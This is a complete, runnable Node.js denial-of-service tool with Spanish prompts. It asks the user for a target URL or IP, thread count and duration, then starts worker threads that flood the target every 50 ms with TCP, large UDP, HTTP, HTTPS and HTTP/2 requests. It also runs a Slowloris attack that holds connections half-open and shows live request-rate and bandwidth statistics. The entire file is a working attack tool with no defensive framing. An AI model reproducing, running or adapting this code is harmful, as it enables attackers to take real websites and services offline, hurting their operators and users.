#!/usr/bin/env node
'use strict';

const net = require('net');
const dgram = require('dgram');
const http = require('http');
const https = require('https');
const http2 = require('http2');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { performance } = require('perf_hooks');
const readline = require('readline');
const chalk = require('chalk');
const { randomBytes, randomFillSync } = require('crypto');
const { URL } = require('url');
const dns = require('dns/promises');
const os = require('os');

class DDoSAttack {
    constructor() {
        this.stats = { total: 0, success: 0, fail: 0, bandwidth: 0 };
        this.workers = [];
        this.methods = ['TCP', 'UDP', 'HTTP', 'HTTPS', 'HTTP2', 'SLOWLORIS'];
    }

    async start() {
        const targetInput = await this.ask(chalk.greenBright('Objetivo (URL/IP): '));
        const { hostname, port } = await this.resolveTarget(targetInput);
        const threads = await this.askNumber(chalk.greenBright('Hilos (100-1000): '), 100, 1000);
        const duration = await this.askNumber(chalk.greenBright('Duración (segundos): '), 10, 3600);
        const ultraMode = await this.ask(chalk.greenBright('¿Modo Ultra? (sí/no): '));
        const intensity = ultraMode.toLowerCase().startsWith('s') ? threads * 2 : threads;

        this.startTime = performance.now();
        this.launchWorkers(hostname, port, intensity);
        this.showStats();
        setTimeout(() => this.stop(), duration * 1000);
    }

    async resolveTarget(input) {
        try {
            if (net.isIP(input)) return { hostname: input, port: 80 };
            if (!input.includes('://')) input = 'http://' + input;
            const parsedUrl = new URL(input);
            const resolved = await dns.lookup(parsedUrl.hostname);
            return { hostname: resolved.address, port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80) };
        } catch {
            console.log(chalk.red('\nError: Objetivo inválido'));
            console.log(chalk.yellow('Ejemplos válidos:'));
            console.log(chalk.yellow('- http://example.com'));
            console.log(chalk.yellow('- 192.168.1.1'));
            console.log(chalk.yellow('- google.com:8080\n'));
            process.exit(1);
        }
    }

    launchWorkers(hostname, port, intensity) {
        const cpus = Math.min(os.cpus().length, 16);
        const payloads = this.generatePayloads(hostname);

        for (let i = 0; i < cpus; i++) {
            const worker = new Worker(__filename, {
                workerData: {
                    hostname,
                    port,
                    payloads,
                    methods: this.methods,
                    intensity: Math.ceil(intensity / cpus)
                }
            });
            worker.on('message', msg => this.updateStats(msg));
            this.workers.push(worker);
        }
    }

    generatePayloads(hostname) {
        const createPayload = size => {
            const buf = Buffer.alloc(size);
            randomFillSync(buf);
            return buf;
        };
        return {
            tcp: createPayload(1024),
            udp: createPayload(65507),
            http: `GET /${randomBytes(8).toString('hex')} HTTP/1.1\r\nHost: ${hostname}\r\n\r\n`
        };
    }

    updateStats({ total, success, fail, bandwidth }) {
        this.stats.total += total;
        this.stats.success += success;
        this.stats.fail += fail;
        this.stats.bandwidth += bandwidth;
    }

    showStats() {
        if (!this.startTime) return;
        const elapsed = (performance.now() - this.startTime) / 1000;
        const rps = (this.stats.total / elapsed || 0).toFixed(0);
        const bw = (this.stats.bandwidth / 1024 ** 2).toFixed(2);

        process.stdout.write(
            chalk`\r{cyan [${elapsed.toFixed(1)}s]} ` +
            chalk`{white Peticiones:} {cyan ${this.stats.total}} ` +
            chalk`{green Éxito:} {cyan ${this.stats.success}} ` +
            chalk`{red Fallo:} {cyan ${this.stats.fail}} ` +
            chalk`{yellow RPS:} {cyan ${rps}} ` +
            chalk`{magenta Ancho de Banda:} {cyan ${bw}MB}`
        );

        setTimeout(() => this.showStats(), 250);
    }

    async ask(question) {
        return new Promise(resolve => {
            const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
            rl.question(question, answer => {
                rl.close();
                resolve(answer);
            });
        });
    }

    async askNumber(question, min, max) {
        let number;
        do {
            number = parseInt(await this.ask(question)) || min;
        } while (number < min || number > max);
        return number;
    }

    stop() {
        this.workers.forEach(w => w.terminate());
        console.log(chalk.red('\n\nAtaque detenido'));
        process.exit();
    }
}

if (isMainThread) {
    new DDoSAttack().start();
} else {
    const { hostname, port, payloads, methods, intensity } = workerData;
    const activeConnections = new Set();

    const attackMethods = {
        TCP: () => {
            const socket = net.connect(port, hostname, () => {
                for (let i = 0; i < 5; i++) socket.write(payloads.tcp);
                report('success', payloads.tcp.length * 5);
                socket.end();
            });
            socket.on('error', () => report('fail', 0));
        },
        UDP: () => {
            const socket = dgram.createSocket('udp4');
            socket.send(payloads.udp, port, hostname, err => {
                err ? report('fail', 0) : report('success', payloads.udp.length);
                socket.close();
            });
        },
        HTTP: () => {
            const options = {
                hostname,
                port,
                path: '/' + randomBytes(4).toString('hex'),
                method: 'GET',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                    'Accept': '*/*',
                    'Connection': 'keep-alive'
                }
            };
            const req = http.request(options, res => {
                res.resume();
                report('success', 0);
            });
            req.on('error', () => report('fail', 0));
            req.end();
        },
        HTTPS: () => {
            const options = {
                hostname,
                port,
                path: '/' + randomBytes(4).toString('hex'),
                method: 'GET',
                rejectUnauthorized: false,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)',
                    'Connection': 'keep-alive'
                }
            };
            const req = https.request(options, res => {
                res.resume();
                report('success', 0);
            });
            req.on('error', () => report('fail', 0));
            req.end();
        },
        HTTP2: () => {
            const client = http2.connect(`https://${hostname}:${port}`, { rejectUnauthorized: false });
            const req = client.request({ ':path': '/' + randomBytes(4).toString('hex') });
            req.on('response', () => {
                req.on('data', () => {});
                req.on('end', () => {
                    report('success', 0);
                    client.close();
                });
            });
            req.on('error', () => {
                report('fail', 0);
                client.close();
            });
            req.end();
        },
        SLOWLORIS: () => {
            const socket = net.connect(port, hostname);
            socket.setKeepAlive(true);
            socket.write(`GET / HTTP/1.1\r\nHost: ${hostname}\r\n`);
            activeConnections.add(socket);
            socket.on('error', () => activeConnections.delete(socket));
        }
    };

    function report(state, bytes) {
        parentPort.postMessage({
            total: 1,
            success: state === 'success' ? 1 : 0,
            fail: state === 'fail' ? 1 : 0,
            bandwidth: bytes
        });
    }

    setInterval(() => {
        for (let i = 0; i < intensity; i++) {
            methods.forEach(method => {
                try {
                    attackMethods[method]();
                } catch {
                    report('fail', 0);
                }
            });
        }
    }, 50);

    setInterval(() => {
        activeConnections.forEach(socket => {
            if (socket.writable) {
                socket.write(`X-a:${randomBytes(4).toString('hex')}\r\n`);
            } else {
                activeConnections.delete(socket);
            }
        });
    }, 8000);
}